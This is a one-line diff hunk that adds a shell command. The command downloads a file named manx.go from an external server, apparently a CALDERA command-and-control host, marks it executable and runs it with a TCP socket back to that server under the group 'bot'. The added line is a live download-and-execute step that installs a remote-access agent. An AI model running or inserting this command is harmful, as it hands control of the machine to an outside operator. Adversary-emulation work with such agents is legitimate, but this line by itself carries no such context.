@@ -1,0 +1,1 @@
+server="http://caldera.serveirc.com:8888";socket="caldera.serveirc.com:7010";contact="tcp";group="bot";curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > manx.go;chmod +x manx.go;./manx.go -http $server -socket $socket -contact $contact -v
